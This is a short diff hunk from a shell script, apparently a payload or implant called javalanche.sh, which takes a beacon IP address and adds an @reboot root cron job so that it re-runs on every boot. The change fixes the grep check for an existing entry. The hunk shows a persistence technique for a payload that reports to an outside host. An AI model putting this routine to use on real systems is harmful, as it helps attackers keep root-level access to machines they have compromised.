@@ -10,7 +10,7 @@ beaconIPAddress="$1"
 
 # Cronjob for this Payload to run on Boot
 cronjob="@reboot root /etc/javalanche.sh $beaconIPAddress"
-checkforcron=$(sudo cat /etc/crontab | /etc/javalanche.sh)
+checkforcron=$(sudo cat /etc/crontab | grep /etc/javalanche.sh)
 if [ -z "$checkforcron"]; then
   (crontab -l ; echo "\n $cronjob") | crontab -
   echo "$cronjob" | sudo tee -a /etc/crontab > /dev/null
